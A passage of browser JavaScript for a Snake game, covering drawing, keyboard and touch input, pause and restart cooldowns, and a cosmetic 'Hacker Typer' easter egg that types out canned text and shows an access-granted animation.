          hackSnakeFormed = snake.length === HACK_U_LENGTH;
        }
      } else if (previousStage === 'tour' && hackMoveIndex >= hackPreUSteps) {
        hackSnakeStage = 'form';
        hackShapeIndex = 1;
      }

      if (hackSnakeStage !== 'formed') hackSetNextFood();
      else food = { x: -1, y: -1 };
      if (hackSnakeFormed && hackStoryComplete && hackAccessPending) showHackAccessGranted();
      markDirty();
      draw();
    }

    function clearHack() {
      var wasActive = isHacking || hackPos > 0;
      if (hackAccessTimer) global.clearTimeout(hackAccessTimer);
      if (accessFlash) accessFlash.classList.remove('is-visible');
      if (accessGlasses) accessGlasses.classList.remove('is-visible');
      hackAccessPending = false;
      isHacking = false;
      hackPos = 0;
      hackStoryComplete = false;
      hackSnakeStage = 'idle';
      hackSnakeFormed = false;
      hackPathHeadFirst = [];
      hackWalkPath = [];
      hackVisited = {};
      hackMoveBudget = 0;
      hackMoveIndex = 0;
      hackPreUSteps = 0;
      hackStepTarget = null;
      if (wasActive) hackStoryIndex = (hackStoryIndex + 1) % HACK_STORIES.length;
      if (hackText) hackText.textContent = '';
      root.classList.remove('is-hacking');
      if (wasActive) emit('hackend');
      // Escape returns to the normal title screen with ordinary food rather
      // than leaving a hack-mode pellet on the board.
      if (!started && !running && snake.length) {
        placeFood();
        markDirty();
        draw();
      }
    }

    function typeHack() {
      if (!isHacking) {
        if (!snake.length) reset();
        isHacking = true;
        root.classList.add('is-hacking');
        beginHackSnake();
        emit('hackstart');
      }
      if (hackStoryComplete) {
        // A fresh hacking story begins at the end of the previous one. It
        // replans its own exact code-key movement budget from the current U.
        hackStoryIndex = (hackStoryIndex + 1) % HACK_STORIES.length;
        hackPos = 0;
        hackStoryComplete = false;
        if (hackText) hackText.textContent = '';
        beginHackSnake();
      }
      var story = HACK_STORIES[hackStoryIndex % HACK_STORIES.length];
      // Exactly 40 characters per key (the final key is clamped to the end), so
      // the snake has precisely ceil(codeLength/40) input-driven moves to tour
      // the board and then trace the U.
      hackPos = Math.min(story.length, hackPos + HACK_CHARS_PER_KEY);
      if (hackText) hackText.textContent = story.slice(0, hackPos);
      if (hackContainer) hackContainer.scrollTop = hackContainer.scrollHeight;
      advanceHackSnake();
      if (hackPos >= story.length) {
        hackStoryComplete = true;
        hackAccessPending = true;
        showHackAccessGranted();
      }
    }

    function isTerminalTheme() {
      return (theme && theme.field === '#020805') || document.documentElement.getAttribute('data-theme') === 'terminal';
    }

    function reset() {
      var cx = Math.floor(cols / 2);
      var cy = Math.floor(rows / 2);
      snake = [];
      for (var i = 0; i < startLength; i++) snake.push({ x: cx - i, y: cy });
      dir = { x: 1, y: 0 };
      queue = [];
      score = 0;
      grow = 0;
      acc = 0;
      wrapFlash = null;
      crashCell = null;
      lastResumeAt = -Infinity; // a new run always allows an immediate first pause
      clearHack();
      placeFood();
    }

    // After a run ends, the next one cannot begin for one second. A key pressed
    // during that window is ignored, so a frantic keypress cannot skip the
    // game-over screen. Timestamps come from the same clock the loop uses.
    var RESTART_LOCKOUT_MS = 1000;
    var deadAt = -Infinity;
    function nowMs() { return (global.performance || Date).now(); }
    function lockoutRemaining() {
      return Math.max(0, RESTART_LOCKOUT_MS - (nowMs() - deadAt));
    }

    // Once you resume from a pause, pausing again is locked out for 5 seconds.
    // A fresh run (reset()) always starts with the cooldown cleared, so the
    // very first pause of a run is never delayed. The auto-pause on tab-hide
    // (onVisibility) bypasses this — it is a safety net, not a player action.
    var PAUSE_LOCKOUT_MS = 5000;
    var lastResumeAt = -Infinity;
    function pauseLockoutRemaining() {
      return Math.max(0, PAUSE_LOCKOUT_MS - (nowMs() - lastResumeAt));
    }

    function start() {
      if (running) return false;
      if (lockoutRemaining() > 0) return false;
      reset();
      started = true;
      running = true;
      paused = false;
      touch = null;
      last = 0;
      root.classList.add('is-active');
      emit('start', state());
      emit('score', score);
      dirty = false;
      draw();
      return true;
    }

    // Where the run ended, for the profile's game log. Cells are y*cols+x
    // indexes (compact: the log loads every game at once). Built only when a
    // run ends, never per frame.
    function endState() {
      var cells = [];
      for (var i = 0; i < snake.length; i++) cells.push(snake[i].y * cols + snake[i].x);
      return {
        cols: cols,
        rows: rows,
        snake: cells,
        food: food.x >= 0 ? food.y * cols + food.x : null,
        crash: crashCell ? crashCell.y * cols + crashCell.x : null,
        cause: crashCell ? 'crash' : 'quit'
      };
    }

    function die() {
      running = false;
      paused = false;
      started = false;
      touch = null;
      deadAt = nowMs();
      root.classList.remove('is-active');
      var over = state();
      over.endState = endState();
      emit('gameover', over);
      dirty = false;
      draw();
    }

    function pushDir(d) {
      var lastDir = queue.length ? queue[queue.length - 1] : dir;
      if (d.x === lastDir.x && d.y === lastDir.y) return;
      if (snake.length > 1 && d.x === -lastDir.x && d.y === -lastDir.y) return;
      if (queue.length < 2) queue.push(d);
    }

    function step() {
      if (queue.length) {
        var next = queue.shift();
        if (snake.length < 2 || !(next.x === -dir.x && next.y === -dir.y)) dir = next;
      }
      var head = snake[0];
      var nx = (head.x + dir.x + cols) % cols;
      var ny = (head.y + dir.y + rows) % rows;

      var limit = grow > 0 ? snake.length : snake.length - 1;
      for (var i = 0; i < limit; i++) {
        if (snake[i].x === nx && snake[i].y === ny) { crashCell = { x: nx, y: ny }; die(); return; }
      }

      if (Math.abs(nx - head.x) > 1 || Math.abs(ny - head.y) > 1) {
        wrapFlash = { x: nx, y: ny, t: (global.performance || Date).now() };
        emit('wrap', { x: nx, y: ny });
      }

      snake.unshift({ x: nx, y: ny });

      if (nx === food.x && ny === food.y) {
        score += 1;
        // During Hacker Typer, each planned route cell is normal visible food,
        // but contributes exactly one growth block regardless of current mode.
        grow += hackMovementStep ? 1 : growthEff();
        if (!hackMovementStep) placeFood();
        emit('score', score);
      }

      if (grow > 0) grow -= 1;
      else snake.pop();
    }

    // ---- render ----------------------------------------------------------
    function roundRectPath(x, y, w, h, r) {
      ctx.beginPath();
      ctx.moveTo(x + r, y);
      ctx.lineTo(x + w - r, y);
      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
      ctx.lineTo(x + w, y + h - r);
      ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
      ctx.lineTo(x + r, y + h);
      ctx.quadraticCurveTo(x, y + h, x, y + h - r);
      ctx.lineTo(x, y + r);
      ctx.quadraticCurveTo(x, y, x + r, y);
      ctx.closePath();
    }

    function withAlpha(hex, alpha) {
      // hex like '#2CE05E' -> rgba() so glows track the theme colour.
      var h = (hex || '').replace('#', '');
      if (h.length === 3) h = h[0] + h[0] + h[1] + h[1] + h[2] + h[2];
      if (h.length !== 6) return hex;
      var r = parseInt(h.slice(0, 2), 16);
      var g = parseInt(h.slice(2, 4), 16);
      var b = parseInt(h.slice(4, 6), 16);
      return 'rgba(' + r + ', ' + g + ', ' + b + ', ' + alpha + ')';
    }

    function refreshHalo() {
      // Colours are derived once per theme change, never per frame.
      haloSnake = withAlpha(theme.snake, Math.min(0.5, theme.snakeGlow * 0.5));
      haloFood = withAlpha(theme.food, Math.min(0.55, theme.foodGlow * 0.55));
    }

    function draw() {
      if (!cssW || !cssH) return;
      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      ctx.fillStyle = theme.field;
      ctx.fillRect(0, 0, cssW, cssH);

      var now = (global.performance || Date).now();

      // food — a red box
      var foodVisible = !theme.blink || Math.floor(now / 420) % 2 === 0;
      if (food.x >= 0 && foodVisible) {
        var pad = Math.max(1, cell * 0.1);
        var fx0 = ox + food.x * cell + pad;
        var fy0 = oy + food.y * cell + pad;
        var fw = cell - pad * 2;
        if (theme.blocks || !theme.roundFood) {
          ctx.beginPath();
          ctx.rect(fx0, fy0, fw, fw);
        } else {
          roundRectPath(fx0, fy0, fw, fw, Math.max(1.5, cell * 0.14));
        }
        if (theme.foodGlow) {
          ctx.strokeStyle = haloFood;
          ctx.lineWidth = cell * 0.5;
          ctx.lineJoin = 'round';
          ctx.stroke();
        }
        ctx.fillStyle = theme.food;
        ctx.fill();
      }

      if (snake.length) {
        ctx.lineJoin = 'round';
        ctx.lineCap = 'round';
        ctx.beginPath();
        if (theme.blocks) {
          var gap = theme.blockGap ? Math.max(1, Math.round(cell * theme.blockGap)) : 0;
          if (gap === 0) {
            // Classic: merge adjacent cells into row spans. Shared edges land on
            // identical device pixels and the silhouette is filled ONCE, with no
            // stroke — so no seams or internal outlines are ever visible.
            spanScratch.length = 0;
            for (var q = 0; q < snake.length; q++) spanScratch.push(snake[q]);
            spanScratch.sort(function (a, b) { return a.y - b.y || a.x - b.x; });
            for (var b = 0; b < spanScratch.length;) {
              var first = spanScratch[b];
              var endX = first.x;
              b++;
              while (b < spanScratch.length && spanScratch[b].y === first.y && spanScratch[b].x === endX + 1) {
                endX = spanScratch[b].x;
                b++;
              }
              var left = Math.round((ox + first.x * cell) * dpr) / dpr;
              var right = Math.round((ox + (endX + 1) * cell) * dpr) / dpr;
              var top = Math.round((oy + first.y * cell) * dpr) / dpr;
              var bottom = Math.round((oy + (first.y + 1) * cell) * dpr) / dpr;
              ctx.rect(left, top, right - left, bottom - top);
            }
          } else {
            // Vintage intentionally retains distinct square tiles.
            for (var v = 0; v < snake.length; v++) {
              var seg = snake[v];
              ctx.rect(
                ox + seg.x * cell + gap / 2,
                oy + seg.y * cell + gap / 2,
                cell - gap,
                cell - gap
              );
            }
          }
          ctx.fillStyle = theme.snake;
          ctx.fill();
        } else {
          // One continuous body, no borders between blocks.
          var prev = null;
          for (var i = 0; i < snake.length; i++) {
            var s = snake[i];
            var px = ox + s.x * cell + cell / 2;
            var py = oy + s.y * cell + cell / 2;
            if (prev && Math.abs(s.x - prev.x) <= 1 && Math.abs(s.y - prev.y) <= 1) {
              ctx.lineTo(px, py);
            } else {
              ctx.moveTo(px, py);
            }
            prev = s;
          }
          if (theme.snakeGlow) {
            ctx.strokeStyle = haloSnake;
            ctx.lineWidth = cell * 1.45;
            ctx.stroke();
          }
          ctx.strokeStyle = theme.snake;
          ctx.lineWidth = cell;
          ctx.stroke();
        }
      }

      // phosphor flash where the body left the wall
      if (wrapFlash) {
        var age = ((global.performance || Date).now() - wrapFlash.t) / 260;
        if (age >= 1) {
          wrapFlash = null;
        } else {
          ctx.save();
          ctx.globalAlpha = (1 - age) * 0.75;
          ctx.fillStyle = theme.snake;
          var fx = ox + wrapFlash.x * cell;
          var fy = oy + wrapFlash.y * cell;
          ctx.fillRect(fx - cell * 0.35, fy - cell * 0.35, cell * 1.7, cell * 1.7);
          ctx.restore();
        }
      }
    }

    // ---- sizing ----------------------------------------------------------
    function resize() {
      var rect = field.getBoundingClientRect();
      if (!rect.width || !rect.height) return;
      dpr = Math.min(global.devicePixelRatio || 1, 2);
      cssW = rect.width;
      cssH = rect.height;
      canvas.width = Math.round(cssW * dpr);
      canvas.height = Math.round(cssH * dpr);
      cell = Math.min(cssW / cols, cssH / rows);
      ox = (cssW - cell * cols) / 2;
      oy = (cssH - cell * rows) / 2;
      positionHackGlasses();
      dirty = false;
      draw();
    }

    // ---- loop ------------------------------------------------------------
    function frameLoop(t) {
      rafId = global.requestAnimationFrame(frameLoop);

      if (running && !paused) {
        var dt = last ? t - last : 0;
        last = t;
        if (dt > 400) dt = 400;
        var ms = speedMs();
        if (ms < 16) {
          // Custom speed in the sub-frame range: exactly one step per frame.
          acc = 0;
          if (dt > 0) { step(); markDirty(); }
        } else {
          acc += dt;
          var guard = 0;
          while (acc >= ms && guard < 6) {
            acc -= ms;
            guard++;
            step();
            markDirty();
            if (!running) break;
          }
        }
      } else {
        last = t;
      }

      // Redraw only when the board changed (or an animation is still running).
      if (dirty || wrapFlash || theme.blink) {
        draw();
        dirty = false;
      }
    }

    // ---- input -----------------------------------------------------------
    var KEYMAP = {
      arrowup: { x: 0, y: -1 }, w: { x: 0, y: -1 },
      arrowdown: { x: 0, y: 1 }, s: { x: 0, y: 1 },
      arrowleft: { x: -1, y: 0 }, a: { x: -1, y: 0 },
      arrowright: { x: 1, y: 0 }, d: { x: 1, y: 0 }
    };

    // The keyboard belongs to the game only while the cabinet is on screen —
    // scrolled down to the manual, arrows still scroll the page as usual.
    // Visibility is cached by an IntersectionObserver: measuring the cabinet on
    // every keypress would force layout and add milliseconds of input lag.
    var onScreen = true;
    var observer = null;

    function engaged() {
      if (running || started) return true;
      if (observer) return onScreen;
      var rect = root.getBoundingClientRect();
      var vh = global.innerHeight || document.documentElement.clientHeight;
      return rect.height > 0 && rect.bottom > 80 && rect.top < vh - 80;
    }

    function onKeyDown(e) {
      if (e.metaKey || e.ctrlKey || e.altKey) return;
      // Keys belong to form fields (and open dialogs) first — the snake must
      // never eat "w" typed into a password box.
      var t = e.target;
      if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT' || t.isContentEditable)) return;
      if (document.querySelector && document.querySelector('dialog[open]')) return;
      var key = (e.key || '').toLowerCase();
      var isArrow = (key === 'arrowup' || key === 'arrowdown' || key === 'arrowleft' || key === 'arrowright');
      var isWasd = (key === 'w' || key === 'a' || key === 's' || key === 'd');
      var d = KEYMAP[key];

      if (isHacking) {
        if (key === 'escape') {
          e.preventDefault();
          clearHack();
          return;
        }
        if (isArrow && d) {
          // Arrow keys at ANY time start the game!
          e.preventDefault();
          clearHack();
          if (!started) start();
          if (running) pushDir(d);
          return;
        }
        // Any other key typed while hacking (space, enter, wasd, letters, digits, symbols):
        // advance the code generation and NEVER stop coding or start the snake!
        e.preventDefault();
        typeHack();
        return;
      }

      if (d) {
        if (paused) {
          // A steering key on the pause screen (or the quit-confirm screen) is
          // the quickest way back in: resume and steer in that direction.
          e.preventDefault();
          resume();
          pushDir(d);
          return;
        }
        if (!engaged()) return;
        e.preventDefault();
        if (!started) start();
        if (running) pushDir(d);
        return;
      }

      // If we are idle/before a run in the Terminal theme, typing any printable key (other than space/enter/wasd/arrows) starts hacker code generation!
      if (!running && !started && isTerminalTheme()) {
        if (key.length === 1 && key !== ' ' && !isWasd) {
          typeHack();
          return;
        }
      }

      if (key === ' ' || key === 'enter') {
        // Preserve native keyboard activation for every button and link.
        if (t && t.closest && t.closest('button, a, [role="button"]')) return;
        if (!running && engaged()) { e.preventDefault(); start(); }
      }
    }

    var touch = null;

    function acceptsTouch() {
      return running && !paused && !document.querySelector('dialog[open]');
    }

    // Mobile browsers vary between Touch Events, Pointer Events and synthetic
    // clicks. Route every tap through this one handler and deduplicate the
    // follow-up events so one physical tap adds exactly one code chunk.
    var lastTerminalTapAt = -Infinity;
    function handleTerminalTap(target, source) {
      // The Ready overlay covers the canvas before a run starts; it is still
      // inside .screen, so a tap there must count as a tap in the playfield.
      var inField = target && target.closest ? target.closest('.snake-field, .screen') : null;
      var now = Date.now();
      // pointerdown -> touchstart is normally less than 80ms; the synthetic
      // click after a touch can arrive ~300ms later. Deduplicate those event
      // representations without suppressing deliberate rapid repeated taps.
      if (source === 'touchstart' && now - lastTerminalTapAt < 80) return true;
      if ((source === 'click' || source === 'pointerdown') && now - lastTerminalTapAt < 650) return true;

      var handled = false;
      if (isHacking) {
        if (inField) typeHack();
        else clearHack();
        handled = true;
      } else if (!running && !started && isTerminalTheme() && inField) {
        typeHack();
        handled = true;
      }
      if (handled) lastTerminalTapAt = now;
      return handled;
    }

    function onTouchStart(e) {
      touch = null;
      var target = e.target;
      // Terminal Hacker Typer taps count as input keys; tapping off the box
      // clears the session. Return before ordinary swipe capture.
      if (handleTerminalTap(target, 'touchstart')) return;

      if (!acceptsTouch() || !e.touches || e.touches.length !== 1) return;
      var control = target && target.closest ? target.closest('input, textarea, select, [contenteditable], dialog') : null;
      if (control && !control.disabled) return;
      var finger = e.touches[0];
      touch = { id: finger.identifier, x: finger.clientX, y: finger.clientY };
      // Do not cancel touchstart: taps must still generate clicks on buttons.
    }

    // Some mobile webviews omit Touch Events but still emit Pointer Events.
    // Catch touch pointerdown as an early fallback; the shared timestamp
    // deduplicates the subsequent touchstart/up/click events from that same tap.
    document.addEventListener('pointerdown', function (e) {
      if (e.pointerType === 'touch') handleTerminalTap(e.target, 'pointerdown');
    }, true);
    document.addEventListener('click', function (e) {
      handleTerminalTap(e.target, 'click');
    });

    function onTouchMove(e) {
      if (!acceptsTouch()) { touch = null; return; }
      if (!touch || !e.touches || e.touches.length !== 1) return;
      var finger = e.touches[0];
      if (finger.identifier !== touch.id) return;
      // Swipes anywhere on the document steer the snake, never the page.
      // Only movement is cancelled; a stationary tap still activates controls.
      if (e.cancelable) e.preventDefault();
      var dx = finger.clientX - touch.x;
      var dy = finger.clientY - touch.y;
      if (Math.abs(dx) < 20 && Math.abs(dy) < 20) return;
      var d = Math.abs(dx) > Math.abs(dy)
        ? { x: dx > 0 ? 1 : -1, y: 0 }
        : { x: 0, y: dy > 0 ? 1 : -1 };
      pushDir(d);
      touch.x = finger.clientX;
      touch.y = finger.clientY;
    }

    function onTouchEnd() { touch = null; }

    // doPause() is the actual pause transition, with no cooldown check — used
    // by the tab-hide safety net, which must always succeed. pause() is the
    // player-facing entry point (pause button, P, Esc) and enforces the
    // 5-second cooldown after a resume.
    function doPause() {
      if (!running || paused) return false;
      paused = true;
      touch = null;
      root.classList.remove('is-active');
      emit('pause', state());
      return true;
    }

    function pause() {
      if (!running || paused) return false;
      if (pauseLockoutRemaining() > 0) return false;
      return doPause();
    }

    function resume() {
      if (!running || !paused) return false;
      paused = false;
      touch = null;
      last = 0;
      root.classList.add('is-active');
      lastResumeAt = nowMs();
      emit('resume', state());
      return true;
    }

    function onVisibility() {
      if (document.hidden) doPause();
    }

    global.addEventListener('keydown', onKeyDown, { passive: false });
    document.addEventListener('touchstart', onTouchStart, { passive: true });
    document.addEventListener('touchmove', onTouchMove, { passive: false });
    document.addEventListener('touchend', onTouchEnd, { passive: true });
    document.addEventListener('touchcancel', onTouchEnd, { passive: true });
    document.addEventListener('visibilitychange', onVisibility);

    var ro = null;
    if (global.ResizeObserver) {
      ro = new global.ResizeObserver(resize);
      ro.observe(field);
    }
    if (global.IntersectionObserver) {
      observer = new global.IntersectionObserver(function (entries) {
        onScreen = entries.length ? entries[0].isIntersecting : true;
      }, { rootMargin: '-80px 0px -80px 0px' });
      observer.observe(root);
    }
    global.addEventListener('resize', resize);

    refreshHalo();
    resize();
    dirty = false;
    draw();
    rafId = global.requestAnimationFrame(frameLoop);

    // ---- api -------------------------------------------------------------
    return {
      levels: LEVELS,
      start: start,
      restart: start,
      lockoutRemaining: lockoutRemaining,
      pauseLockoutRemaining: pauseLockoutRemaining,
      pause: pause,
      resume: resume,
      togglePause: function () {
        if (paused) resume();
        else pause();
      },
      setSpeed: function (id) {
        if (started) return;
        speedId = clampInt(id, 1, 6, speedId);
        useCustomSpeed = false;
        acc = 0;
        emit('speed', speedId);
      },
      setCustomSpeed: function (ms) {
        if (started) return;
        speedCustom = clampInt(ms, 0, 100, speedCustom);
        useCustomSpeed = true;
        acc = 0;
        emit('speed', speedCustom);
      },
      setGrowth: function (n) {
        if (started) return;
        growth = clampInt(n, 1, 5, growth);
        useCustomGrowth = false;
        emit('growth', growth);
      },
      setCustomGrowth: function (n) {
        if (started) return;
        growthCustom = clampInt(n, 0, 100, growthCustom);
        useCustomGrowth = true;
        emit('growth', growthCustom);
      },
      quit: function () {
        if (started) { crashCell = null; die(); }
      },
      clearHack: clearHack,
      isHacking: function () { return isHacking; },
      setTheme: function (t) {
        clearHack();
        if (started || !t) return;
        for (var k in DEFAULT_THEME) {
          theme[k] = Object.prototype.hasOwnProperty.call(t, k) && t[k] !== undefined ? t[k] : DEFAULT_THEME[k];
        }
        refreshHalo();
        dirty = false;
        draw();
      },
      getTheme: function () {
        var copy = {};
        for (var k in theme) copy[k] = theme[k];
        return copy;
      },
      on: function (name, fn) {
        listeners[name] = listeners[name] || [];
        listeners[name].push(fn);
        return this;
      },
      state: state,
      destroy: function () {
        global.cancelAnimationFrame(rafId);
        global.removeEventListener('keydown', onKeyDown);
        document.removeEventListener('touchstart', onTouchStart);
        document.removeEventListener('touchmove', onTouchMove);
        document.removeEventListener('touchend', onTouchEnd);
        document.removeEventListener('touchcancel', onTouchEnd);
        document.removeEventListener('visibilitychange', onVisibility);
        global.removeEventListener('resize', resize);
        if (ro) ro.disconnect();
        if (observer) observer.disconnect();
        root.classList.remove('is-active');
        root.innerHTML = '';
      }
    };
  }

  global.SnakeGame = { create: create, levels: LEVELS };
})(window);
